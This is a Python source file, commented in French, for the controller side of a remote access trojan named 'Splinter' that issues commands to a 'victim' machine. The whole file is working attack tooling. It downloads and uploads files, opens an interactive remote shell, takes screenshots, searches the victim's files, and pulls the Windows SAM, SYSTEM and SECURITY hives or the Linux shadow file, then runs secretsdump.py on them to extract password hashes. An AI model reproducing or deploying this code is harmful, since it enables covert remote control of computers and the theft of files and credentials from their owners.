import os
import base64
import subprocess
import select
from colorama import Fore, Style, init

# Initialisation de Colorama
init(autoreset=True)

def colorama_etoile():
    return Fore.RED + Style.DIM + "[" + Style.RESET_ALL + Fore.GREEN + Style.DIM + "*" + Style.RESET_ALL + Fore.RED + Style.DIM + "] "

def colorama_plus():
    return Fore.RED + Style.DIM + "[" + Style.RESET_ALL + Fore.GREEN + Style.DIM + "+" + Style.RESET_ALL + Fore.RED + Style.DIM + "] "

# Génère un nom de fichier unique dans un répertoire donné
def get_unique_filename(directory, base_filename, extension):
    count = 1
    while True:
        # Crée un nouveau nom de fichier avec un compteur s'il existe déjà
        filename = f"{base_filename}{'(' + str(count) + ')' if count > 1 else ''}{extension}"
        full_path = os.path.join(directory, filename)
        if not os.path.exists(full_path):
            return filename
        count += 1

# Affiche le menu d'aide
def help_menu():
    help_text = print(f"""{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}                                        _   _      _       
                                       | | | | ___| |_ __  
                                       | |_| |/ _ \ | '_ \ 
                                       |  _  |  __/ | |_) |
                                       |_| |_|\___|_| .__/ 
                                                    |_|    
{Style.RESET_ALL}{Fore.RED}{Style.DIM}
=================================================================================================

Voici la liste des commandes disponible sur {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}Splinter{Style.RESET_ALL}{Fore.RED}{Style.DIM} : 

=================================================================================================
                                                   
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}help{Style.RESET_ALL}{Fore.RED}{Style.DIM} : afficher la liste des commandes disponibles
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}download [chemin]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupération de fichiers de la victime vers le serveur
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}upload [chemin]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupération de fichiers du serveur vers la victime
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}shell{Style.RESET_ALL}{Fore.RED}{Style.DIM} : ouvrir un shell (bash ou cmd) interactif
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}ipconfig{Style.RESET_ALL}{Fore.RED}{Style.DIM} : obtenir la configuration réseau de la machine victime
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}screenshot{Style.RESET_ALL}{Fore.RED}{Style.DIM} : prendre une capture d'écran de la machine victime
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}search [mot a rechercher] [chemin de recherche]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : rechercher un fichier sur la machine victime
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}hashdump{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupérer la base SAM ou le fichier shadow de la machine

=================================================================================================            
                 """)
    return help_text

# Envoie une commande au client pour télécharger un fichier
def download_file(conn, file_path, client_directory):
    # Envoie la commande de téléchargement au client
    conn.sendall(f"download {file_path}".encode())

    # Attend la réponse initiale du client qui peut être la taille du fichier ou un message d'erreur
    initial_response = conn.recv(1024).decode()

    # Gère la réponse initiale pour vérifier si le fichier existe
    if initial_response == "FILE_NOT_FOUND":
        print(f"{colorama_plus()}Le fichier {file_path} n'existe pas sur le client.")
        return

    try:
        file_size = int(initial_response)
        # Prépare le chemin de sauvegarde du fichier sur le serveur
        file_name = os.path.basename(file_path)
        download_path = os.path.join(client_directory, file_name)
        
        # Réception et sauvegarde du fichier
        with open(download_path, 'wb') as file:
            remaining = file_size
            while remaining > 0:
                data = conn.recv(min(1024, remaining))
                if not data:
                    raise Exception("Connexion interrompue.")
                file.write(data)
                remaining -= len(data)
        print(f"{colorama_plus()}Fichier téléchargé avec succès : {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{download_path}{Style.RESET_ALL}{Fore.RED}{Style.DIM}")
    except ValueError:
        # Gère le cas où la réponse initiale n'est pas la taille du fichier mais le contenu du fichier
        print(f"{colorama_plus()}Réponse inattendue du client: {initial_response}")

# Envoie une commande au client pour uploader un fichier
def upload_file(conn, file_path):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
            conn.sendall(f"upload {os.path.basename(file_path)}".encode())  # Indication de l'opération
            conn.sendall(str(len(file_data)).encode() + b"\n")  # Taille du fichier
            conn.sendall(file_data)  # Données du fichier
        print(f"{colorama_plus()}Fichier {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{os.path.basename(file_path)}{Style.RESET_ALL}{Fore.RED}{Style.DIM} uploadé avec succès vers le client")
    except FileNotFoundError:
        print(f"{colorama_plus()}Fichier {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{file_path}{Style.RESET_ALL}{Fore.RED}{Style.DIM} non trouvé")

# Ouvre une session shell interactif avec le client
def open_shell(conn):
    conn.sendall("shell".encode())
    while True:
        command = input(colorama_etoile() + "Splinter Shell " + Style.RESET_ALL + Fore.GREEN + Style.DIM + "> " + Style.RESET_ALL + Fore.RED + Style.DIM)
        if command.lower() == "exit":
            break
        conn.sendall(command.encode())
        encoded_response = conn.recv(4096)
        response = base64.b64decode(encoded_response).decode('utf-8', errors='ignore')
        print(response)

# Demande la configuration réseau du client
def get_ipconfig(conn):
    conn.sendall("ipconfig".encode())
    encoded_response = conn.recv(4096)
    response = base64.b64decode(encoded_response).decode('utf-8', errors='ignore')
    print(response)

# Demande une capture d'écran au client
def take_screenshot(conn, client_directory):
    screenshot_filename = get_unique_filename(client_directory, "screenshot", ".jpg")
    screenshot_path = os.path.join(client_directory, screenshot_filename)
    conn.sendall("screenshot".encode())

    # Il attend jusqu'à 5 secondes pour la réponse
    ready = select.select([conn], [], [], 5.0)
    if not ready[0]:  # Si le socket n'est pas prêt à être lu, il annule la commande
        print(f"{colorama_plus()}Le screenshot n'a pas été reçu dans les 5 secondes.")
        return
    
    # Si des données sont prêtes à être lues, procéder à la réception du screenshot
    data_received = bytearray()
    while True:
        part = conn.recv(4096)
        if not part:
            break  # La connexion a été fermée
        data_received += part
        if b"END_OF_SCREENSHOT" in data_received:  # Marqueur de fin de transmission
            break

    # Extraire les données avant le marqueur de fin et les sauvegarder
    end = data_received.index(b"END_OF_SCREENSHOT")
    screenshot_data = data_received[:end]
    with open(screenshot_path, 'wb') as file:
        file.write(base64.b64decode(screenshot_data))
    print(f"{colorama_plus()}Capture d'écran reçue et enregistrée sous {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{screenshot_path}{Style.RESET_ALL}{Fore.RED}{Style.DIM}")

# Lance une recherche de fichiers sur le client
def search_file(conn, search_query, start_path):
    conn.sendall(f"search {search_query} {start_path}".encode())
    data = conn.recv(4096)
    search_results = base64.b64decode(data).decode('utf-8', errors='ignore')
    print(f"{colorama_plus()}Résultats de la recherche dans {start_path} : {search_results}")

# Il s'assure que le répertoire donné existe, sinon il le crée
def ensure_directory_exists(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

# Réceptionne les données envoyées par le client. Cette fonction suppose que le client
# envoie d'abord la taille des données, suivie par les données elles-mêmes
def receive_data_from_client(conn, buffer_size=4096):
    data_size = int(conn.recv(buffer_size).decode())
    data_received = 0
    data = b''
    while data_received < data_size:
        chunk = conn.recv(buffer_size)
        if not chunk:
            break  # Connexion fermée
        data += chunk
        data_received += len(chunk)
    return data

# Réceptionne un fichier envoyé par le client et le sauvegarde dans le chemin spécifié
def receive_file_from_client(conn, file_path, buffer_size=4096):
    data = receive_data_from_client(conn, buffer_size)
    with open(file_path, 'wb') as file:
        file.write(data)

# Utilise secretsdump.py pour extraire les hachages des fichiers SAM, SYSTEM, et SECURITY pour Windows,
# et sauvegarde le résultat dans le même répertoire.     
def execute_secretsdump(hashdump_dir, os_type):
    # Obtient le répertoire courant où se trouve ce script
    current_dir = os.path.dirname(os.path.realpath(__file__))
    secretsdump_path = os.path.join(current_dir, "secretsdump.py")
    
    if os_type == "windows":
        sam_path = os.path.join(hashdump_dir, "sam.save")
        system_path = os.path.join(hashdump_dir, "system.save")
        security_path = os.path.join(hashdump_dir, "security.save")
        output_path = os.path.join(hashdump_dir, "hashes.txt")
        print(f"{colorama_plus()}Lancement de {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}secretsdump.py{Style.RESET_ALL}{Fore.RED}{Style.DIM}\n")
        command = f"python {secretsdump_path} -sam '{sam_path}' -system '{system_path}' -security '{security_path}' LOCAL -outputfile '{output_path}'"
    else:
        return
    
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # Affiche la sortie standard avec colorama
        if result.stdout:
            print(Style.RESET_ALL + Fore.RED + Style.DIM + result.stdout)
        # Affiche les erreurs standard avec colorama
        if result.stderr:
            print(Style.RESET_ALL + Fore.RED + Style.DIM + result.stderr)
        print(f"{colorama_etoile()}Hachages extraits et sauvegardés dans {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{output_path}{Style.RESET_ALL}{Fore.RED}{Style.DIM}")
    except subprocess.CalledProcessError as e:
        print(f"{colorama_etoile()}Erreur lors de l'exécution de {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}secretsdump.py{Style.RESET_ALL}{Fore.RED}{Style.DIM}: {e}")

# Gère le hashdump sur le client
def hashdump(conn, client_directory):
    conn.sendall("hashdump".encode())
    os_type = conn.recv(1024).decode()
    print(f"\nOS du client: {os_type}")
    hashdump_dir = os.path.join(client_directory, "hashdump")
    ensure_directory_exists(hashdump_dir)

    if os_type == "windows":
        file_names = ["sam.save", "system.save", "security.save"]
    elif os_type == "linux":
        file_names = ["shadow.copy"]
    else:
        print(f"{colorama_etoile()}Type d'OS inconnu reçu.")
        return

    for file_name in file_names:
        file_path = os.path.join(hashdump_dir, file_name)
        print(f"{colorama_etoile()}En attente de réception de {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{file_name}{Style.RESET_ALL}{Fore.RED}{Style.DIM}...")
        receive_file_from_client(conn, file_path, 4096)
        print(f"{colorama_plus()}{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{file_name}{Style.RESET_ALL}{Fore.RED}{Style.DIM} reçu et sauvegardé à {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{file_path}{Style.RESET_ALL}{Fore.RED}{Style.DIM}")

    # Une fois tous les fichiers reçus, exécute secretsdump.py pour Windows
    if os_type == "windows":
        execute_secretsdump(hashdump_dir, os_type)
    
    print(f"{colorama_etoile()}Processus de hashdump terminé\n")

# Gère les commandes reçues du client
def handle_command(conn, cmd, client_directory):
    global running
    try:
        parts = cmd.split(" ")
        if parts[0] == "download":
            if len(parts) != 2:
                print(f"Commande {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'download'{Style.RESET_ALL}{Fore.RED}{Style.DIM} incomplète ou incorrecte. Utiliser {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'help'{Style.RESET_ALL}{Fore.RED}{Style.DIM}")
                return
            file_path = parts[1]
            download_file(conn, file_path, client_directory)
        elif cmd.startswith("help"):
            return help_menu()
        elif parts[0] == "upload":
            if len(parts) != 2:
                print(f"Commande {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'upload'{Style.RESET_ALL}{Fore.RED}{Style.DIM} incomplète ou incorrecte. Utiliser {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'help'{Style.RESET_ALL}{Fore.RED}{Style.DIM}")
                return
            file_path = parts[1]
            upload_file(conn, file_path)
        elif cmd.startswith("shell"):
            open_shell(conn)
        elif cmd.startswith("ipconfig"):
            get_ipconfig(conn)
        elif cmd.startswith("screenshot"):
            take_screenshot(conn, client_directory)
        elif parts[0] == "search":
            if len(parts) < 3:
                print(f"Commande {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'search'{Style.RESET_ALL}{Fore.RED}{Style.DIM} incomplète ou incorrecte. Utiliser {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'help'{Style.RESET_ALL}{Fore.RED}{Style.DIM}")
                return
            search_query = parts[1]
            start_path = ' '.join(parts[2:])
            conn.sendall(f"search {search_query} {start_path}".encode())
            search_results = ""
            print(f"{colorama_plus()}La recherche peut prendre plusieurs secondes")
            while True:
                data = conn.recv(4096)
                if base64.b64decode(data) == b"END_OF_SEARCH":
                    break
                search_results += base64.b64decode(data).decode('utf-8', errors='ignore')
            print(f"{colorama_plus()}Résultats de la recherche dans {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{start_path}{Style.RESET_ALL}{Fore.RED}{Style.DIM} : \n\n{search_results}\n")
        elif cmd.startswith("hashdump"):
            hashdump(conn, client_directory)
        else:
            print(f"{colorama_etoile()}Commande non reconnue")
    except ValueError:
        print(f"{colorama_etoile()}Commande incorrecte ou droit insuffisant. Utiliser {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'help'{Style.RESET_ALL}{Fore.RED}{Style.DIM} pour savoir comment utiliser la commande")       
